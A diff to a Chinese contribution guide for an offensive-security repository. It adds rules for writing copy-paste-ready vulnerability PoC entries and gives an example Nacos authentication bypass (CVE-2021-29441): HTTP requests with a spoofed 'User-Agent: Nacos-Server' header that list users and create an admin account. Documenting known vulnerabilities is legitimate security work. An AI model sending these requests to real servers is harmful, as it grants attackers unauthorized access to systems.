@@ -1,6 +1,6 @@
 # AboutSecurity 资源贡献规范
 
-本文档定义了 `Tools/` 和 `skills/` 目录下文件的编写规范，供社区贡献者和 AI 参考。
+本文档定义了 `Tools/`、`skills/` 和 `Vuln/` 目录下文件的编写规范，供社区贡献者和 AI 参考。
 
 ---
 
@@ -33,6 +33,12 @@ AboutSecurity/
 │       ├── php/              # PHP 代码审计
 │       ├── java/             # Java 代码审计（预留）
 │       └── dotnet/           # .NET 代码审计（预留）
+├── Vuln/                     # 结构化漏洞库（按产品分类）
+│   ├── ai/                   # AI 相关产品
+│   ├── cloud/                # 云平台
+│   ├── middleware/            # 中间件（最多）
+│   ├── network/              # 网络设备
+│   └── web/                  # Web 应用
 └── manifest.yaml
 ```
 
@@ -432,13 +438,228 @@ metadata:
 
 ---
 
+# Vuln 漏洞库编写规范
+
+## 1 概述
+
+每条漏洞是一个 Markdown 文件，使用 **YAML 前言 + Markdown 正文** 的格式。每个文件对应一个具体漏洞（通常是一个 CVE/CNVD 编号），提供可直接使用的利用信息。
+
+**与 Skill 的定位区别**：
+- **Vuln（本节）**= 数据层，回答"用什么打"——影响版本、PoC 代码、具体利用步骤
+- **Skill（`skills/exploit/product-vuln/`）**= 方法论层，回答"怎么打"——攻击决策树、多 CVE 编排、后利用技巧
+
+如果你要写的内容是"面对某产品，整体攻击思路和后利用方法"，应该写 Skill；如果是"某个 CVE 的具体 PoC 和利用步骤"，应该写 Vuln。
+
+## 2 目录结构
+
+```
+Vuln/
+├── ai/                       # AI 相关产品
+│   ├── comfyui/
+│   │   ├── CVE-2025-67303.md
+│   │   └── CVE-2026-22777.md
+│   └── dify/
+│       └── DIFY-SSRF-RCE.md
+├── cloud/                    # 云平台
+├── middleware/                # 中间件（ActiveMQ、Nacos、Jenkins 等）
+│   ├── nacos/
+│   │   ├── CVE-2021-29441.md
+│   │   ├── CVE-2021-29442.md
+│   │   ├── NACOS-AUTH-BYPASS.md
+│   │   └── NACOS-DESER-RCE.md
+│   └── ...
+├── network/                  # 网络设备
+└── web/                      # Web 应用
+```
+
+### 目录规则
+
+- **一级目录**按攻击面分类：`ai/`、`cloud/`、`middleware/`、`network/`、`web/`
+- **二级目录**按产品名（小写连字符）：`nacos/`、`grafana/`、`jenkins/`
+- **文件名**用漏洞 ID 大写：`CVE-2021-29441.md`；无 CVE 编号的用 `产品-漏洞类型` 格式：`NACOS-DESER-RCE.md`
+
+### 分类选择
+
+| 一级目录 | 什么产品放这里 | 示例 |
+|----------|--------------|------|
+| `ai/` | AI/ML 平台、LLM 应用 | ComfyUI、Dify、LangFlow、AnythingLLM |
+| `cloud/` | 云服务、云原生基础设施 | AWS API Gateway、K8s |
+| `middleware/` | 中间件、数据库、消息队列、CI/CD | Nacos、ActiveMQ、Jenkins、Grafana、Redis |
+| `network/` | 路由器、交换机、VPN、防火墙 | 安恒网关、Ivanti |
+| `web/` | Web 应用、CMS、管理面板 | WordPress、1Panel、OFBiz |
+
+边界模糊时（如 Harbor 既是中间件也是云原生），优先放 `middleware/`。
+
+## 3 文件格式
+
+### YAML 前言（必填）
+
+```yaml
+---
+id: CVE-2021-29441                    # 漏洞 ID（CVE/CNVD 编号或自定义 ID）
+title: Nacos认证绕过漏洞              # 中文标题，简明描述漏洞
+product: nacos                         # 产品名（小写，与目录名一致）
+vendor: Alibaba                        # 厂商名
+version_affected: "<1.4.1"             # 影响版本范围
+severity: HIGH                         # 严重性：CRITICAL / HIGH / MEDIUM / LOW
+tags: [auth_bypass, 无需认证]          # 标签数组，中英文混合
+fingerprint: ["Nacos"]                 # 指纹关键词数组，用于产品识别
+---
+```
+
+### 字段说明
+
+| 字段 | 必填 | 类型 | 说明 |
+|------|------|------|------|
+| `id` | ✅ | string | CVE/CNVD 编号，或自定义 `产品-漏洞类型` 格式（如 `NACOS-DESER-RCE`） |
+| `title` | ✅ | string | 中文标题，格式：`产品名+漏洞类型+（CVE编号）` |
+| `product` | ✅ | string | 产品名小写，与二级目录名一致 |
+| `vendor` | ✅ | string | 厂商/组织名 |
+| `version_affected` | ✅ | string | 影响版本范围，如 `"<1.4.1"`、`"<=5.18.2"`、`"2.0.0-2.3.5"` |
+| `severity` | ✅ | enum | `CRITICAL` / `HIGH` / `MEDIUM` / `LOW`（必须大写） |
+| `tags` | ✅ | array | 漏洞特征标签：`rce`、`auth_bypass`、`sqli`、`ssrf`、`deserialization`、`无需认证`、`需要认证` 等 |
+| `fingerprint` | 推荐 | array | 产品指纹关键词，用于自动匹配（如 HTTP 响应中的特征字符串） |
+
+### severity 选择标准
+
+| 级别 | 条件 |
+|------|------|
+| `CRITICAL` | 无需认证 + RCE，或无需认证 + 完整数据泄露 |
+| `HIGH` | 需要认证的 RCE，或无需认证的敏感信息泄露/权限绕过 |
+| `MEDIUM` | 需要特定条件的利用，或信息泄露范围有限 |
+| `LOW` | 影响较小，利用条件苛刻 |
+
+## 4 正文结构
+
+按以下章节顺序编写，章节名用二级标题（`##`）：
+
+```markdown
+## 漏洞描述
+
+简明描述漏洞原理，2-3 句话。说明攻击者能做什么，为什么能做到。
+
+## 影响版本
+
+- 产品名 < x.y.z
+- 产品名 x.a.b - x.c.d
+
+## 前置条件
+
+- 是否需要认证
+- 需要访问哪些端口/接口
+- 其他利用条件
+
+## 利用步骤
+
+按顺序描述利用过程，每步一个编号。保持简洁，
+复杂的 payload 放在下方的 Payload 章节。
+
+## Payload
+
+实际可用的 PoC 代码，用代码块标注语言类型。
+优先提供 curl/Python，便于直接复制使用。
+
+## 验证方法
+
+如何确认漏洞已成功利用。
+
+## 修复建议
+
+升级版本、配置缓解措施等（可选但推荐）。
+```
+
+### 正文要求
+
+- **可直接使用**：Payload 应该是复制即用的，不要用 `<替换为你的IP>` 这种占位，用 `target`、`ATTACKER_IP` 等一眼能看出需要替换的通用占位词
+- **语言标注**：代码块标注语言（`bash`、`python`、`http`、`sql`）
+- **一个文件一个漏洞**：不要在一个文件里写多个不相关的 CVE。同一产品的关联漏洞链（如认证绕过 + RCE）可以在一个文件里写组合利用
+- **不写方法论**：不要写"先扫描端口，再判断版本"这种流程。方法论属于 Skill，Vuln 只写这个漏洞本身的 PoC
+
+## 5 完整示例
+
+```markdown
+---
+id: CVE-2021-29441
+title: Nacos认证绕过漏洞（CVE-2021-29441）
+product: nacos
+vendor: Alibaba
+version_affected: "<1.4.1"
+severity: HIGH
+tags: [auth_bypass, 无需认证]
+fingerprint: ["Nacos"]
+---
+
+## 漏洞描述
+
+Nacos 1.4.1 之前的版本中，服务端检查请求头 User-Agent 是否为
+Nacos-Server，匹配则跳过认证。攻击者设置该请求头即可访问所有 API。
+
+## 影响版本
+
+- Nacos < 1.4.1
+
+## 前置条件
+
+- 无需认证
+- 只需添加 `User-Agent: Nacos-Server` 头
+
+## 利用步骤
+
+1. 发送带伪造 User-Agent 头的 GET 请求列出用户
+2. 发送 POST 请求创建新用户
+3. 使用创建的用户登录控制台
+
+## Payload
+
+​```http
+# 列出所有用户
+GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
+Host: target:8848
+User-Agent: Nacos-Server
+
+# 创建新用户
+POST /nacos/v1/auth/users?username=vulhub&password=vulhub HTTP/1.1
+Host: target:8848
+User-Agent: Nacos-Server
+​```
+
+## 验证方法
+
+​```bash
+# 使用创建的账号登录 http://target:8848/nacos/
+# 账号: vulhub / vulhub
+​```
+
+## 修复建议
+
+1. 升级 Nacos 至 1.4.1+
+2. 移除 User-Agent 认证绕过的特殊处理
+3. 对所有 API 接口启用认证
+```
+
+## 6 检查清单
+
+提交 Vuln 前，请确认：
+
+- [ ] 文件放在正确的分类目录下（`Vuln/<category>/<product>/`）
+- [ ] 文件名为漏洞 ID 大写（`CVE-2021-29441.md`）或 `产品-漏洞类型` 格式
+- [ ] YAML 前言包含所有必填字段（id、title、product、vendor、version_affected、severity、tags）
+- [ ] `severity` 为大写枚举值（CRITICAL/HIGH/MEDIUM/LOW）
+- [ ] `product` 与二级目录名一致
+- [ ] 正文包含：漏洞描述、影响版本、前置条件、利用步骤、Payload
+- [ ] Payload 是可直接使用的代码（标注了语言类型）
+- [ ] 一个文件只写一个漏洞（关联漏洞链除外）
+- [ ] 没有写方法论内容（方法论属于 Skill）
+
+---
+
 # 提交流程
 
 1. Fork 本仓库
 2. 在对应目录下创建文件，遵循上述规范
-3. 按对应的检查清单（8 或 10）自查
+3. 按对应的检查清单（Skill 第 10 节 / Tool 第 8 节 / Vuln 第 6 节）自查
 4. 若新增分类，需同步更新 `CONTRIBUTING.md` 中的目录结构和 category 枚举
-5. 提交 PR，标题格式：`[Tool] 添加 xxx` 或 `[Skill] 添加 xxx`
+5. 提交 PR，标题格式：`[Tool] 添加 xxx`、`[Skill] 添加 xxx` 或 `[Vuln] 添加 xxx`
 
 ---
 
